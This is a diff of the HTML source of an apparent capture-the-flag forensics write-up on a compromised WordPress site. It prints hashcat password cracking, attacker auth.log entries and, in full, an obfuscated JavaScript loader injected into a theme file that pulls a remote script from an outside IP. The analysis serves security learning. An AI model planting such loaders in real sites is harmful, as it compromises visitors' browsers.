+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt
 
-Initializing hashcat v0.47 by atom with &lt;span class="m"&gt;8&lt;/span&gt; threads and 32mb segment-size...
+Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
 &lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -204,7 +201,7 @@ Initializing hashcat v0.47 by atom with &lt;span class="m"&gt;8&lt;/span&gt; thr
 &lt;li&gt;word_list.txt is our dictionary&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Now let's take a peak in the output file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat cracked.txt
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat cracked.txt
 &lt;span class="nv"&gt;$P$BmHbpWPZrjt&lt;/span&gt;.2V8T2xDJfbDrAJZ9So1:fluffybunnies
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -229,10 +226,10 @@ Initializing hashcat v0.47 by atom with &lt;span class="m"&gt;8&lt;/span&gt; thr
 &lt;/ul&gt;
 &lt;p&gt;Ah,  also that &lt;code&gt;mailserver_login:login@example.com&lt;/code&gt; and &lt;code&gt;mailserver_pass=password&lt;/code&gt;. Talking about security...&lt;/p&gt;
 &lt;p&gt;Let's move on.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Inspecting /var/logs/apache2&lt;/h2&gt;
 &lt;p&gt;The next item in the list is log inspection. We need wisely choose where to start because there are many of them:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find . -type f  -name &lt;span class="s1"&gt;&amp;#39;*.log&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;find . -type f  -name &lt;span class="s1"&gt;&amp;#39;*.log&amp;#39;&lt;/span&gt;
 ./apache2/error.log
 ./apache2/access.log
 ./apache2/other_vhosts_access.log
@@ -270,13 +267,13 @@ Initializing hashcat v0.47 by atom with &lt;span class="m"&gt;8&lt;/span&gt; thr
 
 &lt;p&gt;We start with the Apache's log, because they carry the connection information. If there is any important information in the log files, it should appears in the end, because the attack should be one of the last things that were logged.&lt;/p&gt;
 &lt;p&gt;It turned out that &lt;a href="http://en.wikipedia.org/wiki/Tail_(Unix)"&gt;Tailing&lt;/a&gt; the &lt;em&gt;apache&lt;/em&gt; logs did not reveal anything useful.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Inspecting var/logs/auth.log&lt;/h2&gt;
 &lt;p&gt;Considering that the password &lt;strong&gt;fluffybunnies&lt;/strong&gt; was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted.&lt;/p&gt;
 &lt;p&gt;Tailing &lt;code&gt;auth.log&lt;/code&gt; shows something interesting:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:18:53 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/chmod -R &lt;span class="m"&gt;775&lt;/span&gt; /var/www/
-Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:20:09 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
-Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:20:55 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/find /var/www/html/ * touch &lt;span class="o"&gt;{}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Sep 17 19:18:53 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/chmod -R 775 /var/www/
+Sep 17 19:20:09 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
+Sep 17 19:20:55 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/find /var/www/html/ * touch &lt;span class="o"&gt;{}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -289,41 +286,41 @@ Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:
 &lt;p&gt;modified a JavaScript file (html5.js) in &lt;em&gt;vi&lt;/em&gt;.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Finding the JavaScript Exploit&lt;/h2&gt;
 &lt;p&gt;It looks like an attack to me! Let's &lt;a href="http://linux.die.net/man/1/diff"&gt;diff&lt;/a&gt; this JavaScript file with the original (&lt;a href="http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html"&gt;which we can just google&lt;/a&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ diff html5.js html5_normal.js
-&lt;span class="m"&gt;93&lt;/span&gt;,122d92
-&amp;lt; var &lt;span class="nv"&gt;g&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ti&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; var &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HTML Tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; var &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;. li colgroup br src datalist script option .&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt; f.length&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
-&amp;lt;     &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;.length.toString&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;diff html5.js html5_normal.js
+93,122d92
+&amp;lt; var &lt;span class="nv"&gt;g&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ti&amp;quot;&lt;/span&gt;;
+&amp;lt; var &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HTML Tags&amp;quot;&lt;/span&gt;;
+&amp;lt; var &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;. li colgroup br src datalist script option .&amp;quot;&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;6&lt;span class="o"&gt;]&lt;/span&gt;;
+&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0; i &amp;lt; f.length; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+&amp;lt;     c +&lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;.length.toString&lt;span class="o"&gt;()&lt;/span&gt;;
 &amp;lt; &lt;span class="o"&gt;}&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;\&amp;#39;ht&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2541&lt;/span&gt; * &lt;span class="m"&gt;6&lt;/span&gt; - &lt;span class="m"&gt;35&lt;/span&gt; + &lt;span class="m"&gt;46&lt;/span&gt; + &lt;span class="m"&gt;12&lt;/span&gt; - &lt;span class="m"&gt;15269&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;56&lt;/span&gt; + &lt;span class="m"&gt;31&lt;/span&gt; + &lt;span class="m"&gt;68&lt;/span&gt; * &lt;span class="m"&gt;65&lt;/span&gt; + &lt;span class="m"&gt;41&lt;/span&gt; - &lt;span class="m"&gt;548&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; / &lt;span class="m"&gt;4000&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; c.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; var &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt; c.length&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
-&amp;lt;     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; w !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
-&amp;lt;         &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; String.fromCharCode&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;46&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt;         w++&lt;span class="p"&gt;;&lt;/span&gt;
+&amp;lt; &lt;span class="nv"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;\&amp;#39;ht&amp;quot;&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 2541 * 6 - 35 + 46 + 12 - 15269;
+&amp;lt; c +&lt;span class="o"&gt;=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;56 + 31 + 68 * 65 + 41 - 548&lt;span class="o"&gt;)&lt;/span&gt; / 4000 - 1;
+&amp;lt; c +&lt;span class="o"&gt;=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
+&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; c.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
+&amp;lt; var &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0;
+&amp;lt; &lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;s&amp;quot;&lt;/span&gt;;
+&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0; i &amp;lt; c.length; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+&amp;lt;     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 3 &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 6&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; w !&lt;span class="o"&gt;=&lt;/span&gt; 2&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 8&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 2&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+&amp;lt;         f +&lt;span class="o"&gt;=&lt;/span&gt; String.fromCharCode&lt;span class="o"&gt;(&lt;/span&gt;46&lt;span class="o"&gt;)&lt;/span&gt;;
+&amp;lt;         w++;
 &amp;lt;     &lt;span class="o"&gt;}&lt;/span&gt;
-&amp;lt;     &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; c&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&amp;lt;     f +&lt;span class="o"&gt;=&lt;/span&gt; c&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;;
 &amp;lt; &lt;span class="o"&gt;}&lt;/span&gt;
-&amp;lt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; k + &lt;span class="s2"&gt;&amp;quot;anal&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&amp;lt; document.write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; + b + &lt;span class="s2"&gt;&amp;quot;=&amp;quot;&lt;/span&gt; + x + &lt;span class="s2"&gt;&amp;quot;tp:&amp;quot;&lt;/span&gt; + k + k + f + i + &lt;span class="s2"&gt;&amp;quot;y&amp;quot;&lt;/span&gt; + g + &lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; + u + v + &lt;span class="s2"&gt;&amp;quot;j&amp;quot;&lt;/span&gt; + u + &lt;span class="s2"&gt;&amp;quot;\&amp;#39;&amp;gt;\&amp;lt;/&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot;\&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&amp;lt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; k + &lt;span class="s2"&gt;&amp;quot;anal&amp;quot;&lt;/span&gt;;
+&amp;lt; document.write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; + b + &lt;span class="s2"&gt;&amp;quot;=&amp;quot;&lt;/span&gt; + x + &lt;span class="s2"&gt;&amp;quot;tp:&amp;quot;&lt;/span&gt; + k + k + f + i + &lt;span class="s2"&gt;&amp;quot;y&amp;quot;&lt;/span&gt; + g + &lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; + u + v + &lt;span class="s2"&gt;&amp;quot;j&amp;quot;&lt;/span&gt; + u + &lt;span class="s2"&gt;&amp;quot;\&amp;#39;&amp;gt;\&amp;lt;/&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot;\&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -331,146 +328,146 @@ Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:
 &lt;p&gt;In JavaScript, the function &lt;code&gt;document.write()&lt;/code&gt; writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to &lt;code&gt;console.log()&lt;/code&gt; (and changing any &lt;code&gt;document&lt;/code&gt; word to &lt;code&gt;console&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;To run JavaScript in the console, you need to install &lt;a href="http://nodejs.org/"&gt;Node&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;So we run and we get a URL:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ node html5.js
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;node html5.js
 &amp;lt;script &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://128.238.66.100/analytics.js&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Analyzing the Second JavaScript Exploit&lt;/h2&gt;
 &lt;p&gt;Awesome, we see a script exploit! Let's get it!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$  wget http://128.238.66.100/analytics.js
---2014-09-25 &lt;span class="m"&gt;19&lt;/span&gt;:17:19--  http://128.238.66.100/analytics.js
-Connecting to &lt;span class="m"&gt;128&lt;/span&gt;.238.66.100:80... connected.
-HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
-Length: &lt;span class="m"&gt;16072&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;16K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/javascript&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; wget http://128.238.66.100/analytics.js
+--2014-09-25 19:17:19--  http://128.238.66.100/analytics.js
+Connecting to 128.238.66.100:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16072 &lt;span class="o"&gt;(&lt;/span&gt;16K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/javascript&lt;span class="o"&gt;]&lt;/span&gt;
 Saving to: ‘analytics.js’
 
-&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[===============================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;,072      --.-K/s   in &lt;span class="m"&gt;0&lt;/span&gt;.008s
+100%&lt;span class="o"&gt;[===============================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; 16,072      --.-K/s   in 0.008s
 
-&lt;span class="m"&gt;2014&lt;/span&gt;-09-25 &lt;span class="m"&gt;19&lt;/span&gt;:17:19 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.02 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘analytics.js’ saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;16072&lt;/span&gt;/16072&lt;span class="o"&gt;]&lt;/span&gt;
